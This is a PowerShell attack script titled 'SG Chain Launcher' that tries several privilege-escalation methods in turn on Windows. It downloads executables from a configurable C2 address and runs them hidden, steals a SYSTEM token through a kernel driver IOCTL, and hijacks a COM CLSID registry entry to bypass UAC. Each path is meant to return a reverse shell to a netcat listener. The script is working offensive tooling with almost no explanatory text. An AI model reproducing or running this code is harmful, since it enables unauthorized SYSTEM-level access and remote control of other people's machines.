# =============================================================
# SG - Unified Chain Launcher v1.0
# Author: JarDani
# Waterfall: tries highest privilege first, falls to lowest
# =============================================================
# Level 0: SYS via st_tk.exe (excluded path)
# Level 1: SYS via kernel IOCTL direct
# Level 2: COM LS32 hijack (zero UAC)
# Level 3: Direct sl.exe (medium shell)
# =============================================================

# ── Configure these before running ───────────────────────────
$kali  = "192.168.217.146"   # Replace with your C2 IP
$port  = 443             # Replace with your listener port
$lpe   = "C:\ProgramData\lpe"

# ── Bootstrap: ensure sl.exe is available ──────────────
function Ensure-Loader {
    # Create directory if not exists
    if(!(Test-Path $lpe)){
        New-Item -ItemType Directory -Path $lpe -Force | Out-Null
        Write-Host "[+] Created $lpe"
    }
    # Download sl.exe
    if(!(Test-Path "$lpe\sl.exe")){
        try {
            Write-Host "[*] Downloading sl.exe..."
            (New-Object Net.WebClient).DownloadFile(
                "http://${kali}:8080/output/sl.exe",
                "$lpe\sl.exe"
            )
            Write-Host "[+] Downloaded sl.exe"
        } catch {
            Write-Host "[-] Download failed: $_"
        }
    }
}

# ── Launch shell quietly ───────────────────────────────────────
function Launch-Shell {
    if(Test-Path "$lpe\sl.exe"){
        Start-Process "$lpe\sl.exe" -WindowStyle Hidden
        return $true
    }
    return $false
}

# ── LEVEL 0: st_tk.exe from excluded path ───────────────
function Try-StealToken {
    Write-Host "[*] Level 0: SYS via st_tk..."
    try {
        IWR -Uri "http://${kali}:8080/tests/st_tk.exe" `
            -OutFile "$lpe\st_tk.exe" -ErrorAction Stop
        if(Test-Path "$lpe\st_tk.exe"){
            Start-Process "$lpe\st_tk.exe" -WindowStyle Hidden
            Start-Sleep 12
            Write-Host "[+] Level 0: st_tk launched"
            return $true
        }
    } catch { Write-Host "[-] Level 0 failed: $_" }
    return $false
}

# ── LEVEL 1: Kernel IOCTL token steal ─────────────────────────
function Try-KernelIOCTL {
    Write-Host "[*] Level 1: SYS via kernel IOCTL..."
    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class SGKernel {
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr CreateFile(string n,uint a,uint s,IntPtr p,uint c,uint f,IntPtr t);
    [DllImport("kernel32.dll")]
    public static extern bool DIC(IntPtr h,uint c,IntPtr i,uint il,IntPtr o,uint ol,ref uint nb,IntPtr ov);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
"@ -ErrorAction SilentlyContinue

        $h = [SGKernel]::CreateFile("\\.\SG",
            [uint32]0xC0000000,0,[IntPtr]::Zero,3,0,[IntPtr]::Zero)
        if($h -ne [IntPtr]::new(-1) -and $h -ne [IntPtr]::Zero){
            $nb = [uint32]0
            $ok = [SGKernel]::DIC($h,
                [uint32]0x00222410,[IntPtr]::Zero,0,
                [IntPtr]::Zero,0,[ref]$nb,[IntPtr]::Zero)
            [SGKernel]::CloseHandle($h) | Out-Null
            if($ok){
                Write-Host "[+] Level 1: SYS token stolen"
                Launch-Shell | Out-Null
                Start-Sleep 8
                return $true
            }
        }
    } catch {}
    Write-Host "[-] Level 1 failed"
    return $false
}

# ── LEVEL 2: COM LS32 hijack (Win10+Win11) ───────────
function Try-COMHijack {
    Write-Host "[*] Level 2: COM LS32 hijack..."
    $clsid = "{32BA16FD-77D9-4AFB-9C9F-703E92AD4BFF}"
    try {
        New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\LS32" `
            -Force | Out-Null
        Set-ItemProperty `
            -Path "HKCU:\Software\Classes\CLSID\$clsid\LS32" `
            -Name "(default)" -Value "$lpe\sl.exe"
        $type = [Type]::GetTypeFromCLSID($clsid)
        try { [Activator]::CreateInstance($type) } catch {}
        Start-Sleep 6
        Write-Host "[+] Level 2: COM hijack triggered"
        return $true
    } catch {
        Write-Host "[-] Level 2 failed: $_"
    } finally {
        Remove-Item "HKCU:\Software\Classes\CLSID\$clsid" `
            -Recurse -Force -ErrorAction SilentlyContinue
    }
    return $false
}

# ── LEVEL 3: Direct medium shell fallback ─────────────────────
function Try-DirectShell {
    Write-Host "[*] Level 3: Direct medium shell..."
    if(Launch-Shell){
        Write-Host "[+] Level 3: Shell launched"
        return $true
    }
    Write-Host "[-] Level 3 failed - sl.exe not found"
    return $false
}

# =============================================================
# MAIN CHAIN
# =============================================================
Write-Host ""
Write-Host "================================================"
Write-Host " SG Chain Launcher"
Write-Host " Author: JarDani"
Write-Host " Target: ${kali}:${port}"
Write-Host "================================================"
Write-Host ""

Ensure-Loader

if(Try-StealToken)  { Write-Host "[*] Done - check Kali nc"; exit }
if(Try-KernelIOCTL) { Write-Host "[*] Done - check Kali nc"; exit }
if(Try-COMHijack)   { Write-Host "[*] Done - check Kali nc"; exit }
if(Try-DirectShell) { Write-Host "[*] Done - check Kali nc"; exit }

Write-Host "[-] All levels failed"
